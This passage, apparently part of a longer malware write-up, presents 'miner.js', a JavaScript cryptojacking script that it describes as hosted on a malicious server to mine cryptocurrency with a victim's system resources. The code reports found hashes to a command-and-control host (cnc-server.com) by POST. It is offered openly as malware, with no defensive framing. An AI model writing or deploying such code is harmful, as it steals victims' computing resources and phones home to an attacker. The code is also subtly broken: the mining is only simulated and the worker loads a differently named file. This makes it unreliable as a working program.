#### 2. **Malicious JavaScript (`miner.js`)**

This script is hosted on a malicious server and is designed to start mining cryptocurrencies using the victim's system resources.

```javascript
// miner.js
const crypto = require('crypto-js'); // For hashing and other utilities
const { Worker } = require('worker_threads'); // For multi-threaded mining

// Function to simulate mining
function mineBlock() {
    const nonce = Math.floor(Math.random() * 1000000000); // Random nonce
    const data = 'Some data to hash'; // Data to hash
    const hash = crypto.SHA256(data + nonce).toString(); // Hash the data + nonce

    if (hash.startsWith('0000')) { // Simple proof-of-work condition
        console.log(`Found valid hash: ${hash}`);
        // Send the result to the C&C server
        fetch('https://cnc-server.com/report', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ nonce, hash })
        }).then(response => response.json())
          .then(data => console.log(data))
          .catch(error => console.error('Error:', error));
    }
}

// Start mining in a worker thread to avoid blocking the main thread
new Worker('./mine.js');

// Periodically check for new work
setInterval(mineBlock, 1000);
```

